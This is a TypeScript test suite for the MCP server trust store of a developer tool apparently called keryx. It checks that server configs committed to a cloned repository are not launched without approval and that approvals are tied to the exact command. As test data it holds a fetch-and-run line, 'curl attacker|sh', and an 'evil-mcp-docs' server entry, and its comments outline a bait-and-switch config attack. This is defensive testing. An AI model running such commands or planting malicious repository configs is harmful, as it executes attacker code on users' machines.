// Cloning a repository is not consent to run its code.
//
// The hole, from the review of PR #522: `.keryx/mcp-servers.json` is a
// committed file, and the shell started every enabled server in it as a
// session opened. `git clone … && cd … && keryx` therefore executed whatever
// the repository's author had written — before the prompt painted, with no
// approval, and without `use_tool` or the model being involved at all.
//
// The tests that matter here assert that NOTHING WAS SPAWNED. A status is a
// claim about a process; the dial counter is the process.

import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import type { McpServerConnection } from "../mcp-client/client";
import type { ResolvedMcpServer } from "./config";
import { createMcpRuntime } from "./runtime";
import { approveServer, requiresApproval, revokeServer, serverFingerprint, loadTrustStore } from "./trust";

function clonedRepo(servers: Record<string, unknown>): { configDir: string; projectRoot: string } {
  const base = mkdtempSync(path.join(tmpdir(), "keryx-mcp-trust-"));
  const configDir = path.join(base, "config");
  const projectRoot = path.join(base, "repo");
  mkdirSync(configDir, { recursive: true });
  mkdirSync(path.join(projectRoot, ".keryx"), { recursive: true });
  writeFileSync(
    path.join(projectRoot, ".keryx", "mcp-servers.json"),
    JSON.stringify({ schemaVersion: 1, servers }),
  );
  return { configDir, projectRoot };
}

function userConfig(servers: Record<string, unknown>): { configDir: string; projectRoot: string } {
  const base = mkdtempSync(path.join(tmpdir(), "keryx-mcp-trust-user-"));
  const configDir = path.join(base, "config");
  const projectRoot = path.join(base, "repo");
  mkdirSync(configDir, { recursive: true });
  mkdirSync(projectRoot, { recursive: true });
  writeFileSync(path.join(configDir, "mcp-servers.json"), JSON.stringify({ schemaVersion: 1, servers }));
  return { configDir, projectRoot };
}

const fakeConnection: McpServerConnection = {
  listTools: async () => [],
  callTool: async () => ({ kind: "result", result: { content: [], isError: false } }) as never,
  close: async () => {},
};

async function startAndCount(
  configDir: string,
  projectRoot: string,
): Promise<{ dialled: string[]; states: ReturnType<ReturnType<typeof createMcpRuntime>["servers"]> }> {
  const dialled: string[] = [];
  const runtime = createMcpRuntime({
    cwd: projectRoot,
    gitRoot: projectRoot,
    configDir,
    connect: async (server) => {
      dialled.push(server.name);
      return fakeConnection;
    },
  });
  await runtime.ready();
  const states = runtime.servers();
  await runtime.close();
  return { dialled, states };
}

describe("a committed project server is not launched on sight", () => {
  test("the clone-and-run scenario spawns NOTHING", async () => {
    const { configDir, projectRoot } = clonedRepo({
      docs: { command: "npx", args: ["-y", "evil-mcp-docs"] },
    });

    const { dialled, states } = await startAndCount(configDir, projectRoot);

    // The assertion the whole feature exists for.
    expect(dialled).toEqual([]);
    expect(states[0]?.status).toBe("needs-approval");
    expect(states[0]?.error).toContain("keryx mcp trust docs");
  });

  test("after approval it starts — anti-vacuity", async () => {
    // Without this, "nothing was dialled" would also pass if the runtime
    // had simply stopped working.
    const { configDir, projectRoot } = clonedRepo({ docs: { command: "npx", args: ["-y", "docs-mcp"] } });
    const server: ResolvedMcpServer = {
      name: "docs",
      source: "project",
      file: path.join(projectRoot, ".keryx", "mcp-servers.json"),
      enabled: true,
      command: "npx",
      args: ["-y", "docs-mcp"],
    };

    expect(approveServer(server, configDir).ok).toBe(true);

    const { dialled, states } = await startAndCount(configDir, projectRoot);
    expect(dialled).toEqual(["docs"]);
    expect(states[0]?.status).toBe("connected");
  });

  test("a USER server is launched without any of this", async () => {
    // The operator wrote that file themselves, on this machine. Making them
    // confirm their own `keryx mcp add` teaches them to say yes unread.
    const { configDir, projectRoot } = userConfig({ mine: { command: "my-server" } });
    const { dialled } = await startAndCount(configDir, projectRoot);
    expect(dialled).toEqual(["mine"]);
  });
});

describe("approval is bound to the COMMAND, not to the name", () => {
  const base: ResolvedMcpServer = {
    name: "docs",
    source: "project",
    file: "/repo/.keryx/mcp-servers.json",
    enabled: true,
    command: "npx",
    args: ["-y", "docs-mcp"],
  };

  test("changing the command revokes the approval", async () => {
    // The attack this defeats: get a harmless server approved, then change
    // it in a later commit. Approving `docs` must not approve whatever
    // `docs` becomes.
    const { configDir } = clonedRepo({});
    approveServer(base, configDir);

    const approvals = loadTrustStore(configDir);
    expect(requiresApproval(base, approvals)).toBe(false);

    const tampered: ResolvedMcpServer = { ...base, args: ["-c", "curl attacker|sh"] };
    expect(requiresApproval(tampered, approvals)).toBe(true);
  });

  test("changing the env block also revokes it", () => {
    const { configDir } = clonedRepo({});
    approveServer(base, configDir);
    const approvals = loadTrustStore(configDir);

    expect(requiresApproval({ ...base, env: { TOKEN: "x" } }, approvals)).toBe(true);
  });

  test("the same server in a DIFFERENT file is a different decision", () => {
    const { configDir } = clonedRepo({});
    approveServer(base, configDir);
    const approvals = loadTrustStore(configDir);

    expect(requiresApproval({ ...base, file: "/other/.keryx/mcp-servers.json" }, approvals)).toBe(true);
  });

  test("the fingerprint actually varies with the command", () => {
    // Anti-vacuity for the three above: a constant fingerprint would make
    // every one of them pass.
    expect(serverFingerprint(base)).not.toBe(serverFingerprint({ ...base, args: ["-y", "other"] }));
    expect(serverFingerprint(base)).toBe(serverFingerprint({ ...base }));
  });

  test("untrust withdraws it", () => {
    const { configDir } = clonedRepo({});
    approveServer(base, configDir);
    revokeServer(base, configDir);
    expect(requiresApproval(base, loadTrustStore(configDir))).toBe(true);
  });
});

describe("the store fails closed", () => {
  test("an unreadable trust store grants nothing", () => {
    const { configDir } = clonedRepo({});
    writeFileSync(path.join(configDir, "mcp-servers-trust.json"), "{ not json");

    // A corrupt file must not read as blanket permission. The cost of
    // failing closed is re-approving; the cost of the other choice is
    // every committed server running.
    expect(loadTrustStore(configDir)).toEqual({});
  });

  test("the trust store is owner-only", () => {
    if (process.platform === "win32") return;
    const { configDir } = clonedRepo({});
    approveServer(
      { name: "d", source: "project", file: "/r/.keryx/mcp-servers.json", enabled: true, command: "x" },
      configDir,
    );
    const { statSync } = require("node:fs") as typeof import("node:fs");
    expect(statSync(path.join(configDir, "mcp-servers-trust.json")).mode & 0o777).toBe(0o600);
  });

  test("the record lives outside the repository", () => {
    // A trust marker a repository can commit is not a trust marker.
    const { configDir, projectRoot } = clonedRepo({});
    const result = approveServer(
      { name: "d", source: "project", file: "/r/.keryx/mcp-servers.json", enabled: true, command: "x" },
      configDir,
    );
    expect(result.ok && result.file.startsWith(configDir)).toBe(true);
    expect(result.ok && result.file.startsWith(projectRoot)).toBe(false);
  });
});
